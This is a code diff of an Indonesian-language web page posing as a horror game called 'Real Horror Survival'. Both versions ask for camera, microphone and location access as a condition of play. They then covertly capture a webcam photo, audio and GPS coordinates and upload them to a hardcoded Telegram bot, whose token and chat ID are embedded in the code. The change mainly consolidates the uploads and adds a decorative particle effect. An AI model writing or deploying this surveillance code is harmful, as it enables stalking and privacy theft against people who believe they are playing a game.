@@ -4,142 +4,196 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Real Horror Survival</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #333;
-            color: white;
+            background-color: #0c0c0c;
+            color: #f0f0f0;
             text-align: center;
-            padding: 50px;
+            overflow: hidden;
+        }
+        h1 {
+            margin-top: 20px;
+            font-size: 3em;
+            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.7);
         }
         button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: red;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: darkred;
-        }
-        #permissionMessage {
-            margin-top: 30px;
-        }
-        #videoContainer {
             margin-top: 20px;
-            display: none;
         }
         #loading {
             display: none;
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+        #cameraContainer {
+            display: none;
+            position: relative;
+            margin-top: 20px;
+        }
+        video {
+            width: 100%;
+            max-width: 640px;
+            border: 2px solid #e63946;
+        }
+        .mic-icon {
+            font-size: 2em;
+            color: red;
+            display: none;
+        }
+        .location {
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1; /* Let the canvas be behind other elements */
         }
     </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Selamat datang di Real Horror Survival!</h1>
+        <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
+        <button class="btn btn-danger btn-lg" onclick="startGame()">Izinkan dan Mulai</button>
+
+        <div id="loading">Loading... Persiapkan diri Anda, permainan dimulai segera!</div>
+
+        <div id="cameraContainer">
+            <video id="video" autoplay></video>
+            <div class="mic-icon" id="micIcon">🎤</div>
+            <div class="location" id="locationDisplay"></div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script>
         let videoStream;
+        let mediaRecorder;
         let audioChunks = [];
 
+        const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram kamu
+        const chatId = "6010073048";  // Ganti dengan ID pengguna Telegram kamu
+
+        function initParticles() {
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ alpha: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            document.body.appendChild(renderer.domElement);
+
+            const particleCount = 1000;
+            const geometry = new THREE.BufferGeometry();
+            const positions = new Float32Array(particleCount * 3);
+            for (let i = 0; i < particleCount; i++) {
+                positions[i * 3] = (Math.random() - 0.5) * 100; // X
+                positions[i * 3 + 1] = (Math.random() - 0.5) * 100; // Y
+                positions[i * 3 + 2] = (Math.random() - 0.5) * 100; // Z
+            }
+            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+            const material = new THREE.PointsMaterial({ color: 0xffffff, size: 0.5 });
+            const particles = new THREE.Points(geometry, material);
+            scene.add(particles);
+
+            camera.position.z = 50;
+
+            function animateParticles() {
+                requestAnimationFrame(animateParticles);
+                particles.rotation.y += 0.001; // Rotate particles for a dynamic effect
+                renderer.render(scene, camera);
+            }
+
+            animateParticles();
+        }
+
         async function startGame() {
-            // Menampilkan pesan persetujuan izin
-            document.getElementById("permissionMessage").style.display = "block";
-
-            // Minta izin untuk akses kamera, mikrofon, dan lokasi
+            document.getElementById("loading").style.display = "block";
             try {
+                // Minta izin untuk akses kamera dan mikrofon
                 videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById("loading").style.display = "none";
+                document.getElementById("cameraContainer").style.display = "block";
+                document.getElementById("video").srcObject = videoStream;
 
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                // Mulai mendeteksi suara
+                mediaRecorder = new MediaRecorder(videoStream);
+                mediaRecorder.onstart = () => {
+                    document.getElementById("micIcon").style.display = "block";
+                    setInterval(() => {
+                        document.getElementById("micIcon").style.opacity = document.getElementById("micIcon").style.opacity === "1" ? "0.5" : "1";
+                    }, 500);
+                };
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+                mediaRecorder.start();
+
+                // Dapatkan lokasi
+                navigator.geolocation.watchPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    document.getElementById("locationDisplay").innerText = `Lokasi Anda: ${latitude}, ${longitude}`;
                 });
 
-                // Jika izin diberikan, lanjut ke proses perekaman
-                document.getElementById("loading").style.display = "block";
-                capturePhotoAndAudio(position.coords);
+                // Inisialisasi partikel
+                initParticles();
+
+                // Deteksi orientasi perangkat
+                window.addEventListener('deviceorientation', (event) => {
+                    updateParticlesOrientation(event.alpha, event.beta, event.gamma);
+                });
+
+                // Ambil foto setelah beberapa detik
+                setTimeout(() => {
+                    capturePhotoAndSend();
+                }, 5000);
+
             } catch (error) {
                 console.error("Akses ditolak atau terjadi kesalahan:", error);
                 alert("Akses ditolak. Anda tidak bisa melanjutkan permainan.");
             }
         }
 
-        function capturePhotoAndAudio(coords) {
-            const video = document.createElement("video");
-            video.srcObject = videoStream;
-            video.play();
+        function capturePhotoAndSend() {
+            const video = document.getElementById("video");
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL("image/png");
 
-            // Rekam audio
-            const mediaRecorder = new MediaRecorder(videoStream);
-            mediaRecorder.start();
-
-            mediaRecorder.ondataavailable = event => {
-                audioChunks.push(event.data);
-            };
-
-            // Setelah 5 detik, ambil foto, video, dan audio
-            setTimeout(() => {
-                // Ambil foto dari video
-                const canvas = document.createElement("canvas");
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL("image/png");
-
-                // Rekam video
-                const recordedVideoBlob = new Blob(audioChunks, { type: "video/webm" });
-
-                // Stop video & audio recording
-                video.pause();
-                mediaRecorder.stop();
-
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    sendToTelegram(imageData, coords, recordedVideoBlob, audioBlob);
-                };
-            }, 5000);
+            // Kirim data ke Telegram
+            sendToTelegram(photoData);
         }
 
-        function sendToTelegram(imageData, location, videoBlob, audioBlob) {
-            const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram
-            const chatId = "6010073048";      // Ganti dengan ID Telegram kamu
-
-            // Kirim lokasi
-            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    latitude: location.latitude,
-                    longitude: location.longitude
-                })
-            });
+        function sendToTelegram(photoData) {
+            const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
 
             // Kirim foto
-            const photoBlob = dataURItoBlob(imageData);
-            const formDataPhoto = new FormData();
-            formDataPhoto.append("chat_id", chatId);
-            formDataPhoto.append("photo", photoBlob, "image.png");
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: formDataPhoto
-            });
-
-            // Kirim video
-            const formDataVideo = new FormData();
-            formDataVideo.append("chat_id", chatId);
-            formDataVideo.append("video", videoBlob, "video.webm");
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                method: "POST",
-                body: formDataVideo
-            });
+            const photoBlob = dataURItoBlob(photoData);
+            formData.append("photo", photoBlob, "photo.png");
 
             // Kirim audio
-            const formDataAudio = new FormData();
-            formDataAudio.append("chat_id", chatId);
-            formDataAudio.append("audio", audioBlob, "audio.webm");
+            formData.append("audio", audioBlob, "audio.webm");
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
-                method: "POST",
-                body: formDataAudio
+            // Kirim lokasi
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+                formData.append("latitude", latitude);
+                formData.append("longitude", longitude);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).then(response => {
+                    console.log("Data terkirim ke Telegram.");
+                }).catch(err => {
+                    console.error("Gagal mengirim data ke Telegram:", err);
+                });
             });
         }
 
@@ -153,22 +207,5 @@
             return new Blob([ab], { type: 'image/png' });
         }
     </script>
-</head>
-<body>
-    <h1>Selamat datang di game Real Horror Survival!</h1>
-    <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
-    <button onclick="startGame()">Izinkan dan Mulai</button>
-
-    <div id="permissionMessage" style="display: none; margin-top: 20px;">
-        <p>Izinkan kami untuk mengakses foto, suara, dan lokasi Anda untuk melanjutkan permainan.</p>
-    </div>
-
-    <div id="loading" style="display: none;">
-        <p>Loading... Persiapkan diri Anda, permainan dimulai segera!</p>
-    </div>
-
-    <div id="videoContainer" style="display: none;">
-        <video id="videoElement" width="640" height="480" autoplay></video>
-    </div>
 </body>
 </html>
